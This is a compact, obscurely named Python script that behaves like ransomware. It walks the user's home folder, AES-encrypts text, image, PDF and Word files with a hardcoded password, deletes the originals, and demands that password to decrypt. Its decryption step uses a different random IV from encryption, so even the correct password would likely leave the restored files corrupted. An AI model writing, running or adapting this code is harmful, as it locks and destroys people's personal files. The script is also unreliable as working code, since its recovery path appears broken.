import os,tkinter as t,tkinter.simpledialog as sd,base64 as b,Crypto.Cipher.AES as a,Crypto.Util.Padding as p
x=(".txt",".jpeg",".pdf",".docx",".doc");y=".enc"
def j(f,c,d=False):
    with open(f,'rb')as e: g=e.read()
    if not d:h=b.b64encode(c.encrypt(p.pad(g,a.block_size)))
    else:h=p.unpad(c.decrypt(b.b64decode(g)),a.block_size)
    if not d:k=f+y
    else:k=f.replace(y,"")
    with open(k,'wb')as e:e.write(h)
    if k!=f:os.remove(f)
    return k
def k(l,c,d=False):
    m=[];z=[m.append(j(f,c,d))for f in l if d or not f.endswith(y)];return m
def l(s,e=None):
    if e is None:e=[]
    n=[];[[n.append(os.path.join(r,f))for f in q if f.endswith(e)]for r,_,q in os.walk(s)];return n
def o(u):
    r=t.Tk();r.withdraw();return sd.askstring("Password",u,show="*")
def i():
    w="swordf!sh";v=w.encode()
    while len(v)<16:v+=b'\x00'
    s=a.new(v,a.MODE_CBC);t=a.new(v,a.MODE_CBC)
    u=os.path.expanduser("~");r=l(u,x);c=k(r,s,False);print("Files have been encrypted. To decrypt, enter the correct password.")
    e=o("Enter your password to decrypt files:")
    if e!=w:print("Incorrect password. Files cannot be decrypted.");return
    d=[f for f in c if f.endswith(y)];k(d,t,True);print("Files have been decrypted.")
if __name__=="__main__":i()
